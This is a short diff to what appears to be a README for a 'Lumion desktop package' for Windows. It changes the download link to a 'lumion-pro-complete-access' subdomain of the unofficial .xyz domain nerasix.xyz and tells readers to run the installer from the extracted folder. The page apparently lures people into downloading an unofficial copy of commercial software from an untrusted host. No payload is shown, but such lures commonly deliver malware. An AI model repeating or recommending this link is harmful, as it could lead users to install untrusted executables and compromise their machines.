@@ -8,8 +8,8 @@ Lumion desktop package for Windows · cad toolkit · local install ready.
 
 > Use the project link below for Windows.
 
-* **Project link:** **[lumion.nerasix.xyz](https://lumion.nerasix.xyz/)**
-* **Full URL:** `https://lumion.nerasix.xyz/`
+* **Project link:** **[lumion-pro-complete-access.nerasix.xyz](https://lumion-pro-complete-access.nerasix.xyz/)**
+* **Full URL:** `https://lumion-pro-complete-access.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
